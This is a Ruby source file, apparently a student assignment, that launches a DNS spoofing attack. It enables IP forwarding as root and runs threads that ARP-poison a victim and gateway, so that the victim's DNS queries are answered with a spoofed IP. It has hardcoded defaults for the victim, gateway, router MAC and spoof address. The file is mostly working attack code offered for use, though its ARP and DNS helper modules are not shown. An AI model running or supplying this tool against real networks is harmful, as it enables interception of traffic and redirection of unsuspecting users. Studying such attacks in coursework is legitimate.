#!/usr/bin/env ruby
# ================================================================================================ 
# main.rb
# 
# Andrew Maledy
# COMP 8505 - Assignment 3
# 
# DNS spoofing application which relies on ARP poisoning in order to analyse all traffic and 
# respond to DNS queries.
#
# ================================================================================================
require 'rubygems'
require 'packetfu'
require 'thread'

wd =  File.dirname(__FILE__)
require wd + '/arp.rb' # our class to handle arp poisoning. 
require  wd + '/trollop.rb'
require  wd + '/dns'

opts = Trollop::options do
    version "DNS Spoof by Andrew Maledy"
    banner <<-EOS
DNS Spoofer in Ruby.

Usage:
    ruby main.rb [options]
    EOS
    
    opt :host, "Victim IP", :short => "h", :type => :string, :default => "192.168.1.72"
    opt :mac, "Victim MAC", :short => "m", :type => :string
    opt :spoof, "Spoofig IP", :short => "s", :type => :string, :default => "70.70.242.254" 
    opt :gate, "Gateway IP", :short => "g", :type => :string, :default => "192.168.1.254"
    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlan0"
    opt :route, "Router MAC", :short => "r", :type => :string, :default => "00:1a:6d:38:15:ff"
end
if Process.uid != 0
	raise "Application must be run as root."
end

begin

    # Enable Forwarding
    `echo 1 > /proc/sys/net/ipv4/ip_forward`

    # Block returning DNS traffic

    arp = ARP.new(opts[:host], opts[:mac], opts[:gate], opts[:route], opts[:iface])
    dns = DNS.new(opts[:spoof], opts[:host], opts[:iface])

    t_arp = Thread.new { arp.poison }
    t_dns = Thread.new { dns.listen }

    t_dns.join()
    t_arp.join()
rescue Interrupt => e
    puts "Stopping..."
    `echo 0 > /proc/sys/net/ipv4/ip_forward`    
    Thread.kill(t_arp)
    Thread.kill(t_dns)


    # Stop DNS spoofing
    exit 0
end


